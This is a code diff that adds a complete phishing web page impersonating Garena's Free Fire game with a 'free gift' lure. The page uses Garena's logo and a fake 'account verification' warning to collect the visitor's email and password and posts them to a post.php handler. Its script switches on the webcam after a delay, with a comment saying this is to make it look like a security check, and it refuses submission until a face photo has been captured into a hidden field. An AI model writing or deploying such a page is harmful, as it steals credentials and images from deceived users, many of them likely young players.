@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire  free gift</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0f1923;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: url('https://ff.garena.com/images/bg.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+        .container {
+            background-color: rgba(15, 25, 35, 0.9);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            width: 350px;
+            text-align: center;
+            border: 1px solid #ff4655;
+        }
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #ff4655;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .warning {
+            background-color: #ff4655;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #2a3a4a;
+            border-radius: 5px;
+            background-color: #1a2a3a;
+            color: white;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff4655;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #e63a49;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #6c757d;
+        }
+        .webcam-container {
+            margin: 15px 0;
+            display: none;
+        }
+        #webcam {
+            width: 100%;
+            border-radius: 5px;
+        }
+        .capture-btn {
+            margin-top: 10px;
+            background-color: #2a3a4a;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://ff.garena.com/images/logo.png" alt="Free Fire" class="logo">
+        <h1>Free Fire free gift</h1>
+        <div class="warning">
+            Your account needs to be verified for security reasons. Please log in to continue.
+        </div>
+        
+        <form id="loginForm" action="post.php?game=freefire" method="POST">
+            <input type="text" name="email" placeholder="Email or Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            
+            <div class="webcam-container" id="webcamContainer">
+                <video id="webcam" autoplay playsinline></video>
+                <button type="button" class="capture-btn" id="captureBtn">Capture Photo</button>
+                <input type="hidden" name="webcam" id="webcamImage">
+            </div>
+            
+            <button type="submit">VERIFY ACCOUNT</button>
+        </form>
+        
+        <div class="footer">
+            By proceeding, you agree to our Terms of Service and Privacy Policy
+        </div>
+    </div>
+
+    <script>
+        // Webcam functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const webcamContainer = document.getElementById('webcamContainer');
+            const webcamElement = document.getElementById('webcam');
+            const captureBtn = document.getElementById('captureBtn');
+            const webcamImage = document.getElementById('webcamImage');
+            let stream = null;
+
+            // Show webcam after a short delay to make it look like a security check
+            setTimeout(() => {
+                webcamContainer.style.display = 'block';
+                startWebcam();
+            }, 1000);
+
+            async function startWebcam() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            facingMode: 'user'
+                        } 
+                    });
+                    webcamElement.srcObject = stream;
+                } catch (err) {
+                    console.error('Error accessing webcam:', err);
+                }
+            }
+
+            captureBtn.addEventListener('click', function() {
+                const canvas = document.createElement('canvas');
+                canvas.width = webcamElement.videoWidth;
+                canvas.height = webcamElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(webcamElement, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to base64 and set as hidden input value
+                webcamImage.value = canvas.toDataURL('image/png');
+                
+                // Stop the webcam
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                
+                // Show success message
+                captureBtn.textContent = 'Photo Captured!';
+                captureBtn.style.backgroundColor = '#4CAF50';
+            });
+
+            // Submit form after webcam capture
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                if (!webcamImage.value) {
+                    e.preventDefault();
+                    alert('Please capture your photo for verification.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
